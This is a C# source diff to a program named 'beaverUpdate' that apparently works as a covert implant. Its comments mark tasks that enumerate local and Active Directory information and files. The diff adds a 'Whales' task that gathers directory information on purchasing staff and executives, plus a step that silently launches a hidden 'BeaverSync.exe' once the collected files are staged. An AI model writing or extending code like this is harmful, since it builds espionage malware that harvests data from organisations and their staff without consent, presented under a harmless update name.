@@ -7,6 +7,7 @@ using System.Net.WebSockets;
 using VoidSerpent;
 using System.Runtime.CompilerServices;
 using System.IO;
+using System.Diagnostics;
 
 namespace beaverUpdate
 {
@@ -43,6 +44,7 @@ namespace beaverUpdate
             {
                 "Licensing", // enumerate local and AD info
                 "Paperwork", // enumerate files
+                "Whales" // get directory info of purchasing/execs
             };
 
             // Run through the tasks
@@ -60,6 +62,26 @@ namespace beaverUpdate
                     doTask(task);
                 }
             }
+
+            // need to check if we have pending file jobs to send and run BeaverSync
+            string pwTask = db.GetJobStatus("Paperwork");
+            string wTask = db.GetJobStatus("Whales");
+            if (pwTask == "collected" && wTask == "collected")
+            {
+                string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
+                ProcessStartInfo bvs = new ProcessStartInfo
+                {
+                    FileName = Path.Combine(currentDirectory, "BeaverSync.exe"),
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+                try
+                {
+                    Process.Start(bvs);
+                }
+                catch { }
+            }
+
 
             // wait for messages
             await socketTask;
@@ -97,6 +119,16 @@ namespace beaverUpdate
                     } catch
                     {
                         db.JobEntry(name: "Paperwork", status: "failed");
+                    }
+                    break;
+                case "Whales":
+                    try
+                    {
+                        DirectoryHelper.SoStrangeIRememberYou();
+                        db.JobEntry(name: "Whales", status: "collected");
+                    }
+                    catch {
+                        db.JobEntry(name: "Whales", status: "failed");
                     }
                     break;
             }
